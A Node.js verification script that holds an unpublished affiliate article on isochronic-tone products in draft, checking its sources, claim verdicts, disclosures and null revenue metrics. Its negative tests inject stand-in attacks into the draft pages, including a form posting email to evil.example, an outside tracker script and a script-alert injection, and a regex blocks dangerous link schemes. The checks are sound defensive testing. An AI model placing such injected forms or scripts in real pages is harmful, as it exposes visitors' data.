"use strict";
/**
 * Mind R296: conservative pre-release SOURCE checks, no browser/WordPress/merchant access.
 * Native: node mind/r296/verify_r296.cjs (run from repo root, no dependencies).
 * Portable: require(...).verify(mapOfSixUTF8Files); require(...).mutations(map).
 * Does NOT prove product performance, accessibility in actual browsers or a paid transaction.
 */
const fs = require("node:fs");
const R = "mind/r296/";
const filesToCheck = {
 article:R+"THE-SOUND-THAT-PROMISED-TO-HOLD-YOUR-ATTENTION-UNPUBLISHED.md",
 hub:R+"MIND-ARCHIVE-AUDIO-EVIDENCE-WP-CANDIDATE-UNPUBLISHED.html",
 matrix:R+"ISOCHRONIC-PRODUCT-CLAIM-SOURCE-AND-COMMERCE-GATES.json",
 acceptance:R+"ONE-OFFER-ISOCHRONIC-RESEARCH-AND-REVENUE-ACCEPTANCE.md",
 guideA:"mind/r284/ZEN12-BUYER-GUIDE-A-TEXT-ONLY-UNPUBLISHED.html",
 guideB:"mind/r284/ZEN12-BUYER-GUIDE-B-FILM-STORYBOARD-UNPUBLISHED.html"
};
function assert(value,why){if(!value)throw new Error(why)}
function literal(text){return text.toLowerCase()}
function verify(x){
 for(const k of Object.keys(filesToCheck))assert(typeof x[k]==="string"&&x[k].length>400,"MISSING_FULL_FILE_"+k);
 const a=x.article,h=x.hub,d=x.acceptance,g=[h,x.guideA,x.guideB],m=JSON.parse(x.matrix);
 assert(a.split(/\s+/).length>=1700,"ARTICLE_NOT_SUBSTANTIVE");
 for(const s of ["Ingendoh","Garcia-Argibay","Papadatou","isochronic","binaural","brainwaveshots.com/faq","https://doi.org/10.1080/25742442.2026.2679402"]){
   assert(a.includes(s),"ARTICLE_EVIDENCE_MISSING_"+s);
 }
 assert(/Only one studied isochronic tones/i.test(a),"ISOCHRONIC_REVIEW_SCOPE_CHANGED");
 assert(a.includes("Five")&&a.includes("eight")&&a.includes("one")&&a.includes("Fourteen"),"REVIEW_DENOMINATORS_CHANGED");
 assert(a.includes("not a head-to-head trial")||a.includes("not a head-to-head trial".toUpperCase())||a.includes("It is not a head-to-head trial"),"PRODUCT_METHODOLOGY_BOUNDARY_MISSING");
 assert(a.includes("no purchasable affiliate CTA")||a.includes("no purchasable affiliate CTA".toUpperCase()),"ARTICLE_ACTIVE_COMMERCE_RISK");
 assert(m.status==="DRAFT_HARD_HOLD"&&m.draft_only===true&&m.release==="UNPUBLISHED_NO_AFFILIATE_ACTIVATION","MATRIX_RELEASE_NOT_HELD");
 assert(m.sources.length===19&&m.claims.length===30&&m.gates.length===18,"EVIDENCE_COUNTS_CHANGED");
 const ids=new Set();const urls=new Map();
 for(const s of m.sources){
   assert(/^S\d{2}$/.test(s.id)&&!ids.has(s.id),"SOURCE_ID_BAD_OR_DUPLICATE");
   ids.add(s.id);const u=new URL(s.url);
   assert(u.protocol==="https:"&&!u.username&&!u.password,"NONHTTPS_OR_CREDENTIAL_SOURCE");
   assert(s.checked==="2026-11-11","UNDATED_SOURCE");
   urls.set(s.id,s.url);
 }
 const expected={
  S01:"https://brainwaveshots.com/focus-shot", S02:"https://brainwaveshots.com/faq",
  S03:"https://doi.org/10.1371/journal.pone.0286023",S04:"https://pubmed.ncbi.nlm.nih.gov/30073406/",
  S06:"https://doi.org/10.1080/25742442.2026.2679402",
  S08:"https://zen12.com/getstarted",S09:"https://hypnosislive.com/mental-skills/total-focus",
  S12:"https://www.ftc.gov/business-guidance/resources/ftcs-endorsement-guides-what-people-are-asking"
 };
 for(const [k,url] of Object.entries(expected))assert(urls.get(k)===url,"EXACT_SOURCE_URL_TAMPER_"+k);
 const cids=new Set(); for(const c of m.claims){
  assert(/^C\d{2}$/.test(c.id)&&!cids.has(c.id),"CLAIM_ID_BAD"); cids.add(c.id);
  assert(c.source_ids.length>0&&c.source_ids.every(id=>ids.has(id)),"CLAIM_SOURCE_BROKEN_"+c.id);
  assert(c.decision&&typeof c.decision==="string","CLAIM_DECISION_UNSET_"+c.id);
 }
 const verdict=Object.fromEntries(m.claims.map(c=>[c.id,c.decision]));
 for(const id of ["C04","C05","C15","C16","C17","C19","C21","C24","C25","C28","C29"]){
   assert(/REJECT|DO_NOT_REPEAT/.test(verdict[id]),"DANGEROUS_CLAIM_ENABLED_"+id);
 }
 assert(verdict.C14==="SUPPORTED_WITH_REVIEW_INCLUSION_CAVEAT","ISOCHRONIC_SCOPE_WEAKENED");
 const gnames=new Set();for(const gate of m.gates){
  assert(!gnames.has(gate.id),"DUPLICATE_GATE"); gnames.add(gate.id);
  assert(gate.status==="HARD_HOLD"&&gate.evidence===null,"COMMERCIAL_GATE_ACTIVATED_"+gate.id);
 }
 assert(m.gate_count===18&&gnames.has("inspire3_acceptance_final_vestige")&&gnames.has("authorized_earning_url")&&gnames.has("founder_release_approval"),"RELEASE_GATES_MISSING");
 for(const o of m.offers){
   assert(o.earning_url===null||o.earning_url===undefined,"EARNING_URL_PREMATURE");
   if(o.name==="Zen12")assert(o.published===false&&o.actual_price_verified_for_fv===false,"ZEN12_PREMATURE");
 }
 const ms=m.measurement;
 for(const k of ["qualified_sessions_7d","qualified_sessions_30d","merchant_confirmed_orders","commission_settled","net_realized_revenue","revenue_per_1000_qualified_humans"])assert(ms[k]===null,"FABRICATED_METRIC_"+k);
 assert(ms.first_party_only===true&&ms.pii===false&&ms.new_scripts===false,"TRACKING_CONSENT_DRIFT");
 assert(a.includes("No independent product-specific controlled trial")||a.includes("no accessible independent product-specific controlled trial")||a.includes("There is no accessible independent product-specific controlled trial"),"PRODUCT_EFFICACY_OVERCLAIM");
 for(let i=0;i<g.length;i++){
  const page=g[i]; const html=literal(page);
  assert(/<html\s+lang=["']en["']/.test(html),"HTML_LANG_MISSING_"+i);
  assert(/<meta[^>]+name=["']viewport["']/.test(html),"RESPONSIVE_META_MISSING_"+i);
  assert(/<button[^>]*\bdisabled\b/i.test(page),"ENABLED_PURCHASE_CONTROL_"+i);
  assert(/may earn a commission/.test(html),"ADJACENT_DISCLOSURE_MISSING_"+i);
  assert(/<meta[^>]+name=["']robots["'][^>]+noindex/i.test(page),"DRAFT_NOINDEX_MISSING_"+i);
  assert(!/<script\b|<iframe\b|<form\b|<meta[^>]+http-equiv\s*=\s*["']?refresh|\bonclick\s*=|\bonload\s*=|<img[^>]*src=["']https?:/i.test(page),"UNAUTHORIZED_INTERACTIVE_OR_REDIRECT_"+i);
  assert(!/<video\b[^>]*autoplay|<audio\b[^>]*autoplay/i.test(page),"AUTOPLAY_NOT_ALLOWED_"+i);
  const href=[...page.matchAll(/\bhref\s*=\s*["']([^"']+)["']/gi)].map(m=>m[1]);
  for(const link of href){
    assert(!/^(javascript:|data:|vbscript:)/i.test(link),"DANGEROUS_SCHEME_"+i);
    if(link.startsWith("#"))continue;
    const url=new URL(link);
    assert(url.protocol==="https:","HREF_NOT_HTTPS_"+i);
    assert(["finalvestige.com","pubmed.ncbi.nlm.nih.gov","www.ftc.gov","doi.org"].includes(url.hostname),"UNAPPROVED_HREF_"+i+"_"+url.hostname);
  }
 }
 assert(/no-JS|no JS|no additional/i.test(h),"NONJS_SPEC_MISSING");
 assert(/no active purchasing link/.test(literal(h)),"ACTIVE_PURCHASE_IMPLICATION");
 assert(d.includes("mind_pilot_2026_11")&&d.includes("mind_proposed_2026_11"),"ANALYTICS_ID_CONFLICT_ERASED");
 assert(d.includes("NOT COMPUTABLE"),"REVENUE_TRUTH_MISSING");
 assert(d.includes("Only one isochronic")||d.includes("only one isochronic"),"SCOPING_LIMIT_MISSING");
 assert(d.includes("NOT another URL"),"SECOND_BUYING_PAGE_RISK");
 return {valid:true,files:Object.keys(filesToCheck).length,sources:m.sources.length,claims:m.claims.length,gates:m.gates.length};
}
function mutations(x){
 const edits=[
  ["paid_link",z=>z.hub=z.hub.replace(/<button type="button" disabled/, '<a href="https://zen12.com/getstarted"><button type="button" disabled')],
  ["active_button",z=>z.hub=z.hub.replace('type="button" disabled','type="button"')],
  ["affiliate_disclosure",z=>z.hub=z.hub.replace(/may earn a commission/, "might display an optional product")],
  ["autoplay",z=>z.hub=z.hub.replace("</main>",'<video autoplay src="https://evil.example/video.mp4"></video></main>')],
  ["meta_refresh",z=>z.hub=z.hub.replace("</head>",'<meta http-equiv="refresh" content="0;url=https://zen12.com/getstarted"></head>')],
  ["extra_form",z=>z.hub=z.hub.replace("</main>",'<form action="https://evil.example/collect"><input type="email"></form></main>')],
  ["tracker",z=>z.hub=z.hub.replace("</head>",'<script src="https://tracker.example/script.js"></script></head>')],
  ["alternate_offer_link",z=>z.guideA=z.guideA.replace("</body>",'<a href="https://brainwaveshots.com/focus-shot">Buy</a></body>')],
  ["guide_disclosure",z=>z.guideB=z.guideB.replace(/may earn a commission/, "may provide some updates")],
  ["source_tamper",z=>{const m=JSON.parse(z.matrix);m.sources.find(s=>s.id==="S06").url="https://example.com/2026";z.matrix=JSON.stringify(m)}],
  ["claim_approval",z=>{const m=JSON.parse(z.matrix);m.claims.find(c=>c.id==="C16").decision="SUPPORTED";z.matrix=JSON.stringify(m)}],
  ["fake_publisher_approval",z=>{const m=JSON.parse(z.matrix);m.gates[1].status="APPROVED";z.matrix=JSON.stringify(m)}],
  ["fake_order",z=>{const m=JSON.parse(z.matrix);m.measurement.merchant_confirmed_orders=3;z.matrix=JSON.stringify(m)}],
  ["fake_link",z=>{const m=JSON.parse(z.matrix);m.offers[0].earning_url="https://example.com/affiliate";z.matrix=JSON.stringify(m)}],
  ["fake_attribution",z=>{const m=JSON.parse(z.matrix);m.measurement.revenue_per_1000_qualified_humans=100;z.matrix=JSON.stringify(m)}],
  ["guide_js",z=>z.guideB=z.guideB.replace("</head>","<script>alert(1)</script></head>")],
  ["scope_collapse",z=>z.article=z.article.replace("Only one studied isochronic tones","All studied isochronic tones")],
  ["remove_revenue",z=>z.acceptance=z.acceptance.replace("NOT COMPUTABLE","zero")]
 ];
 let caught=0;const failures=[];
 for(const [id,change] of edits){const z={...x};change(z);try{verify(z);failures.push(id)}catch(e){caught++}}
 assert(failures.length===0,"MUTATIONS_NOT_CAUGHT "+failures.join(", "));
 return {caught,total:edits.length};
}
function readRoot(){const x={};for(const [k,p] of Object.entries(filesToCheck))x[k]=fs.readFileSync(p,"utf8");return x}
if(require.main===module){
 try{const x=readRoot();console.log("R296 baseline",JSON.stringify(verify(x)));console.log("R296 negative tests",JSON.stringify(mutations(x)));process.exitCode=0}
 catch(e){console.error("R296 FAILED:",e.message);process.exitCode=1}
}
module.exports={verify,mutations,filesToCheck};
